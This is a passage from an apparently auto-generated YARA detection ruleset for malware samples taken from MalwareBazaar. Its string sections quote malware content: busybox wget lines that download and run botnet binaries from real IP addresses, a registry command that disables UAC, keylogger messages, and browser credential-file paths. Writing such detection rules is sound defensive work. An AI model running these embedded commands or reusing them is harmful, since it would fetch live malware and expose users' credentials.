      $s19 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://91.188.254.21/oops/loki.x86 ; chmod 777 lok" ascii
      $s20 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://91.188.254.21/oops/loki.mips ; chmod 777 l" ascii
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      8 of them
}

rule f32cf2b81fbefacc285af3267bbe0bad5131ceaf79cf57d952e13abadd944ac0 {
   meta:
      description = "evidences - file f32cf2b81fbefacc285af3267bbe0bad5131ceaf79cf57d952e13abadd944ac0.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "f32cf2b81fbefacc285af3267bbe0bad5131ceaf79cf57d952e13abadd944ac0"
   strings:
      $s1 = "BmtC.uMx" fullword ascii
      $s2 = "4600&?_28" fullword ascii /* hex encoded string 'F(' */
      $s3 = "OF:\"s_#_6" fullword ascii
      $s4 = "/ /Q^u" fullword ascii
      $s5 = "Y@Ql -" fullword ascii
      $s6 = "D[#wr+ " fullword ascii
      $s7 = " -32h:" fullword ascii
      $s8 = "[6[,* " fullword ascii
      $s9 = "b%ryf%." fullword ascii
      $s10 = "\\ga3.lkf" fullword ascii
      $s11 = "\\wSERKeX-" fullword ascii
      $s12 = "\\(8MAUZBNb&ou$" fullword ascii
      $s13 = "%V#,+ " fullword ascii
      $s14 = "\\ZUYn3G)P" fullword ascii
      $s15 = "=%.- %" fullword ascii
      $s16 = "M9- &v" fullword ascii
      $s17 = "$* \\5O\\" fullword ascii
      $s18 = " -y*}9f7" fullword ascii
      $s19 = "fbzn9<x6" fullword ascii
      $s20 = ")meQueX}" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 3000KB and
      8 of them
}

rule fd21f7c9ae4b46e5b0a91843b447e2cf95847c99825132c74035465281988c88 {
   meta:
      description = "evidences - file fd21f7c9ae4b46e5b0a91843b447e2cf95847c99825132c74035465281988c88.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "fd21f7c9ae4b46e5b0a91843b447e2cf95847c99825132c74035465281988c88"
   strings:
      $s1 = "swift.exe" fullword ascii
      $s2 = " @@/3?D35&" fullword ascii /* hex encoded string '=5' */
      $s3 = "mmpzfow" fullword ascii
      $s4 = "qMI.pOJ:<" fullword ascii
      $s5 = "H+o:\"z" fullword ascii
      $s6 = "H&k&q:\"" fullword ascii
      $s7 = "#;J:\"&" fullword ascii
      $s8 = "hgEKiR7" fullword ascii
      $s9 = " /G?lL" fullword ascii
      $s10 = "ZDewRj2" fullword ascii
      $s11 = "JHHBEn4" fullword ascii
      $s12 = "yIHEYg8" fullword ascii
      $s13 = "M5n /qZ0" fullword ascii
      $s14 = "a=+  l" fullword ascii
      $s15 = "a~+ KQ(" fullword ascii
      $s16 = "s\\(' -DS" fullword ascii
      $s17 = "n6}o+ " fullword ascii
      $s18 = "ccjtuo" fullword ascii
      $s19 = "FweM!2+" fullword ascii
      $s20 = "_SKyG?" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0_6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c_0 {
   meta:
      description = "evidences - from files 348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0.exe, 6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74.exe, 8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0"
      hash2 = "6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74"
      hash3 = "8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s5 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide
      $s6 = "[+] before ShellExec" fullword ascii
      $s7 = "[+] ShellExec success" fullword ascii
      $s8 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s9 = "[+] ucmCMLuaUtilShellExecMethod" fullword ascii
      $s10 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s11 = "rmclient.exe" fullword wide
      $s12 = "Keylogger initialization failure: error " fullword ascii
      $s13 = "[-] CoGetObject FAILURE" fullword ascii
      $s14 = "Offline Keylogger Started" fullword ascii
      $s15 = "Online Keylogger Stopped" fullword ascii
      $s16 = "Offline Keylogger Stopped" fullword ascii
      $s17 = "Online Keylogger Started" fullword ascii
      $s18 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide
      $s19 = "Executing file: " fullword ascii
      $s20 = "\\logins.json" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0_6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c_1 {
   meta:
      description = "evidences - from files 348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0.exe, 6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74.exe, 87c5727d6f8d8c15808ed2aebc102e8b6c9132d260192a1e6835c8927f38c375.dll, 8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "348313e26d18c728d3fa29df8f33b204d6ff8da4a0d368877fa8ca6f76f735d0"
      hash2 = "6197d6bb199187cf7d390f656740be53239a60492534d5c9a623f5ec4c481c74"
      hash3 = "87c5727d6f8d8c15808ed2aebc102e8b6c9132d260192a1e6835c8927f38c375"
      hash4 = "8b30bffd85a7b5743deee0ad43d35c3a855d2693a602d4e86665c02da015a355"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = "operator co_await" fullword ascii
      $s3 = " Base Class Descriptor at (" fullword ascii
      $s4 = " Class Hierarchy Descriptor'" fullword ascii
      $s5 = " Complete Object Locator'" fullword ascii
      $s6 = "owner dead" fullword ascii /* Goodware String - occured 567 times */
      $s7 = "network down" fullword ascii /* Goodware String - occured 567 times */
      $s8 = "wrong protocol type" fullword ascii /* Goodware String - occured 567 times */
      $s9 = "connection already in progress" fullword ascii /* Goodware String - occured 567 times */
      $s10 = "network reset" fullword ascii /* Goodware String - occured 567 times */
      $s11 = "connection aborted" fullword ascii /* Goodware String - occured 568 times */
      $s12 = "protocol not supported" fullword ascii /* Goodware String - occured 568 times */
      $s13 = "network unreachable" fullword ascii /* Goodware String - occured 569 times */
      $s14 = "host unreachable" fullword ascii /* Goodware String - occured 571 times */
      $s15 = "protocol error" fullword ascii /* Goodware String - occured 588 times */
      $s16 = "permission denied" fullword ascii /* Goodware String - occured 592 times */
      $s17 = "connection refused" fullword ascii /* Goodware String - occured 597 times */
      $s18 = "broken pipe" fullword ascii /* Goodware String - occured 635 times */
      $s19 = "__swift_1" fullword ascii
      $s20 = "__swift_2" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142_4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56_2 {
   meta:
      description = "evidences - from files 1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142.unknown, 4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142"
      hash2 = "4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s2 = "AAAAAAAAAADAA" ascii /* base64 encoded string '       0 ' */
      $s3 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s4 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s6 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s7 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s8 = "TRjNlNXYC12byZEA0JXZ252bDBgb39GZ0VHaTBgb39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAc" ascii
      $s9 = "F8qcoMjFKAAALhiFwBQBvK3ERAAACILOGAAAmgCcAUQpy9wMWoAAAsEKWAHAFUqcTEBAAIQ04Ag3KAAAlgiBAAgJooAAAICKKAAAQiiCAAAlvhQEKAAAQiCBAAAH+pAA" ascii
      $s10 = "f1URUNVWT91UFBARFJVSVFVRS9VWBxEUTlERfNVRAMVVPVlTJRlTPN0XTVEAf9VZ1xWY2BQb15WRAUWbpR1dkBQZ6l2UiNGAlBXeUVWdsFmVAU2avZnbJBAdsV3clJ1Y" ascii
      $s11 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s12 = "v5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT" ascii
      $s13 = "BYjARQw1MEVAZAQxPofAJRAyPsnABQQwBYjABQwuPwUA5TQrPQRAxHQ9O4fApTwmC0UAZTQlOceAhLgnBYTARTQhMEVAZAQcC0UAJHwBOMaAJBQcOMZABTwfOUYAJRQe" ascii
      $s14 = "r92bIN3dvRmbpd1av9GauVFAklEZhVmcoR1dkBAZv1EaA4mZwxGAr92bIRWaAgXRr92bIN3dvRmbpdFdlNFAEl0av9GafBwYvJHcfBgTX9ERZV0Sf10VAUGb0lGV39GZ" ascii
      $s15 = "4AAAAAAAAAEBA" ascii /* base64 encoded string '       @@' */
      $s16 = "fDAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '|0           ' */
      $s17 = "EbFE0AAAAAAAA" ascii /* base64 encoded string 'lQ4      ' */
      $s18 = "vhBBAAQK+pAABAhfRAAA5AAAAAEAEAzGqcAArsgCAEwDvpAAA01bU8hFKAAAa9WCYLztOaQEFERBTY9FFEhJKAAAX9mCAEgDoAHAN0ucEIRCEMRkFEhBRAyKFMhFGMhB" ascii
      $s19 = "NiBcAYwcyRxBlxiCAAAsoYBcAYwaypAAA8KKUQBFBAAAD0oFwBgAZLHFHsgmGExBRAAAEELOGMhFHMhCAAgrvZAAAQAzAZhCAAwSoYBcAYQXypAAA06bGogmEERBRAAA" ascii
      $s20 = "M9FdldGAvZmbJ1WZ0NXeTVGbpZEAl1WaUVGdhREAvZmbJVGbpZEAuFWZs92bCBQblR3c5N1ZulGdhJXZw9EdpJEN2MXSfRXZnBwajFGUlNWa2JXZT9FdldGAu9WazJXZ" ascii
   condition:
      ( uint16(0) == 0x4141 and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4_fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b93_3 {
   meta:
      description = "evidences - from files 1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4.rar, fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4"
      hash2 = "fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d"
   strings:
      $s1 = "Xmonopr" fullword ascii
      $s2 = "RBjqUn2" fullword ascii
      $s3 = "ygiU**g" fullword ascii
      $s4 = "zzBS|oO" fullword ascii
      $s5 = "Y[idrl{-P" fullword ascii
      $s6 = "~|xusomkhfd``\\\\YY" fullword ascii
      $s7 = "^niwi?" fullword ascii
      $s8 = "wIRhnih" fullword ascii
      $s9 = "%}hxZrRct" fullword ascii
      $s10 = "Y.QSW<" fullword ascii
      $s11 = "\\jlaq(" fullword ascii
      $s12 = "'*u&?_-a[" fullword ascii
      $s13 = "B=v1,%c" fullword ascii
      $s14 = "/,MKE;P" fullword ascii
      $s15 = ")}iTlTh" fullword ascii
      $s16 = "P>paL9yO" fullword ascii
      $s17 = "4}TV&I" fullword ascii
      $s18 = "%;m<yf" fullword ascii
      $s19 = "=H2k7+" fullword ascii
      $s20 = "n VX<HR" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b_fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b93_4 {
   meta:
      description = "evidences - from files fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b.rar, fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b"
      hash2 = "fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d"
   strings:
      $s1 = "\\A2%h;" fullword ascii
      $s2 = "'aWcf`+k" fullword ascii
      $s3 = "FpDG:@I" fullword ascii
      $s4 = "l.6^0yR" fullword ascii
      $s5 = "98ZtuZT" fullword ascii
      $s6 = "]Y{gO<@" fullword ascii
      $s7 = "-,\"|5V|" fullword ascii
      $s8 = "x|_lcu" fullword ascii
      $s9 = "VI^10J" fullword ascii
      $s10 = "Ld(*sD" fullword ascii
      $s11 = "nUK58h" fullword ascii
      $s12 = "ers'zz" fullword ascii
      $s13 = "m(\\ZZ7" fullword ascii
      $s14 = "3_A\"^Ar$J" fullword ascii
      $s15 = "oz:c|2" fullword ascii
      $s16 = "'?\\~J9q" fullword ascii
      $s17 = "9ig[;BY" fullword ascii
      $s18 = "v~&qZT" fullword ascii
      $s19 = "`\"f(-S" fullword ascii
      $s20 = "Hy@X6#(" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4_fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4_5 {
   meta:
      description = "evidences - from files 1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4.rar, fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b.rar, fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4"
      hash2 = "fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b"
      hash3 = "fce6218eda97d21dc46c3d8042bed93e3d26a9751bcc7aad22cda66b935c3b0d"
   strings:
      $s1 = "^pvDD\"6" fullword ascii
      $s2 = "HPuTD\"Wf`Ef" fullword ascii
      $s3 = "Q,()eA" fullword ascii
      $s4 = "&*b]0J" fullword ascii
      $s5 = "i6yi3w" fullword ascii
      $s6 = "y&lQCim" fullword ascii
      $s7 = "f\"Ui`h" fullword ascii
      $s8 = "%:8i`-iRB" fullword ascii
      $s9 = "UT\"3gph" fullword ascii
      $s10 = " P7C?V" fullword ascii
      $s11 = "P%'6F\"" fullword ascii
      $s12 = "I2F\\:AX" fullword ascii
      $s13 = "UT2#Xph" fullword ascii
      $s14 = "wF]]W+" fullword ascii
      $s15 = "Iv{ljp\"" fullword ascii
      $s16 = "$-]CLZ" fullword ascii
      $s17 = "k2kidI" fullword ascii
      $s18 = "_J5pRM" fullword ascii
      $s19 = "-P{G%V" fullword ascii
      $s20 = "z{3=F[6@" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4_fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4_6 {
   meta:
      description = "evidences - from files 1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4.rar, fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1c289db78a48eeb82c7d5cce5c45fedb96aed5bbc1fcfe0f3e59d2c6f7e630e4"
      hash2 = "fc05934c2dd38f5443589c2f688496b69fd90c07b1557ad578a15d39f4e4766b"
   strings:
      $s1 = "5VAiu\\," fullword ascii
      $s2 = "exGzys^;" fullword ascii
      $s3 = "dXwNI>." fullword ascii
      $s4 = "?*^rVz],OJ" fullword ascii
      $s5 = "Z:j]%Ps" fullword ascii
      $s6 = "RXwV[S" fullword ascii
      $s7 = "0<le5w<" fullword ascii
      $s8 = "[mqi_L" fullword ascii
      $s9 = "^Y/>y'" fullword ascii
      $s10 = "HWo$n`0" fullword ascii
      $s11 = "!CS[g`" fullword ascii
      $s12 = "38FyjU" fullword ascii
      $s13 = "7'(JR)" fullword ascii
      $s14 = "ei3l5Y" fullword ascii
      $s15 = "])Y0rvE" fullword ascii
      $s16 = "G|)}}HA" fullword ascii
      $s17 = "a8akG~" fullword ascii
      $s18 = "a{4?V5" fullword ascii
      $s19 = "~ewvj+" fullword ascii
      $s20 = "#A$NQ,Z" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6_e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317_7 {
   meta:
      description = "evidences - from files 0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6.elf, e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317af2196.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "0d9572d540ccc11e49eb972d67b224239e31393e7fe396ac6620aa44b846a9f6"
      hash2 = "e5e475db5076e112f69b61ccb36aaedfbb7cac54a03a4a2b3c6a4a9317af2196"
   strings:
      $s1 = "listen" fullword ascii /* Goodware String - occured 304 times */
      $s2 = "socket" fullword ascii /* Goodware String - occured 452 times */
      $s3 = "GLIBC_2.4" fullword ascii
      $s4 = "__gmon_start__" fullword ascii
      $s5 = "system" fullword ascii /* Goodware String - occured 1577 times */
      $s6 = "__xstat" fullword ascii
      $s7 = "__errno_location" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 11000KB and ( all of them )
      ) or ( all of them )
}

rule _1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142_4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56_8 {
   meta:
      description = "evidences - from files 1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142.unknown, 4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca.unknown, 73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142"
      hash2 = "4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca"
      hash3 = "73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678"
   strings:
      $s1 = "AAAAAAAAAAAAAAAEAAAAA" ascii
      $s2 = "FAAAAABAAA" ascii
      $s3 = "AAAABAAAAA" ascii
      $s4 = "BAAAFAAAABAAA" ascii
      $s5 = "AAAAAAAAA8AAAE" ascii
      $s6 = "AAADAAAA8AABA" ascii
      $s7 = "AAAAAAcEAAA" ascii
      $s8 = "C4BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s9 = "BAAAAAEC3A" ascii
      $s10 = "EAAAAAAC4AEAA1E" ascii
      $s11 = "AAAACAAAAA" ascii
      $s12 = "BAACAAAAAA" ascii
      $s13 = "AAA03bEAAA" ascii
      $s14 = "FBAAECAAAA1A" ascii
      $s15 = "CAAAFAdEAA" ascii
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x3d3d ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678_f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e_9 {
   meta:
      description = "evidences - from files 73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678.unknown, f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678"
      hash2 = "f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0"
   strings:
      $s1 = "BAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s2 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
      $s3 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s4 = "AAAADAAAAAA" ascii
      $s5 = "AAAAAAAAAAEAAA" ascii
      $s6 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s7 = "DAAAAAAAAAAEAAAAAAAAAABAA" ascii
      $s8 = "AAAAAEBAAAAAAAAAAAAAAAAAAAEAAAAABAAAAAAAAA8DAAAAAAEAAAAAAAAAABAAAAEAAA4" ascii
      $s9 = "AAAaAAAABA" ascii
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 1 times */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s12 = "AAACAAAAEA" ascii
   condition:
      ( uint16(0) == 0x3d3d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292_081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a_10 {
   meta:
      description = "evidences - from files 06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292.sh, 081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a65d5a9.sh, 2285df6e099990a09534b394c899a44d5d0f5227a7e961eb64b02deb0a5f04ed.sh, 6c2ce066e969d0c675dd041b54676ef522d29b7b9343a0a75ca94e1c29346d8c.sh, 70a1f6eaf99349bbc42ec40209794b1078d572e09a125eb941af29e6ec0d3bfa.sh, 9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167.sh, cdd468dd2693ac457dc71927713c20a5d86eaf818c132b4247190d50125922ce.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292"
      hash2 = "081dedbfdd521cf24f7b6a8ed747e7106e4a656ae5d33780df65f19d6a65d5a9"
      hash3 = "2285df6e099990a09534b394c899a44d5d0f5227a7e961eb64b02deb0a5f04ed"
      hash4 = "6c2ce066e969d0c675dd041b54676ef522d29b7b9343a0a75ca94e1c29346d8c"
      hash5 = "70a1f6eaf99349bbc42ec40209794b1078d572e09a125eb941af29e6ec0d3bfa"
      hash6 = "9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167"
      hash7 = "cdd468dd2693ac457dc71927713c20a5d86eaf818c132b4247190d50125922ce"
   strings:
      $s1 = "    exe_path=$(readlink -f \"/proc/$pid/exe\" 2> /dev/null)" fullword ascii
      $s2 = "for proc_dir in /proc/[0-9]*; do" fullword ascii
      $s3 = "    if [ -z \"$exe_path\" ]; then" fullword ascii
      $s4 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s5 = "            kill -9 \"$pid\"" fullword ascii
      $s6 = "        continue" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 3KB and ( all of them )
      ) or ( all of them )
}

rule _06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292_9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac_11 {
   meta:
      description = "evidences - from files 06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292.sh, 9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "06240d6f9990a658a2ff844a1f591256c6088ac086dc036e700f73f55504c292"
      hash2 = "9588242243192b7fd00cb43b138b2f2a8d487b6e3007bbfb2cf2403aac2b5167"
   strings:
      $s1 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t3; chmod +x t3; chmod 777 t3; ./t3 selfrep.arm.wget;" fullword ascii
      $s2 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t2; chmod +x t2; chmod 777 t2; ./t2 selfrep.mpsl.wget;" fullword ascii
      $s3 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t4; chmod +x t4; chmod 777 t4; ./t4 selfrep.arm5.wget;" fullword ascii
      $s4 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t5; chmod +x t5; chmod 777 t5; ./t5 selfrep.arm6.wget;" fullword ascii
      $s5 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t1; chmod +x t1; chmod 777 t1; ./t1 selfrep.mips.wget;" fullword ascii
      $s6 = "cd /tmp; /bin/busybox wget http://103.136.41.100/t6; chmod +x t6; chmod 777 t6; ./t6 selfrep.arm7.wget;" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 3KB and ( all of them )
      ) or ( all of them )
}

rule _4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca_73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217_12 {
   meta:
      description = "evidences - from files 4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca.unknown, 73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca"
      hash2 = "73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678"
   strings:
      $s1 = "FAAAAAAABA" ascii
      $s2 = "FAAAAEABAAAAC" ascii
      $s3 = "AA4AAAAADA" ascii
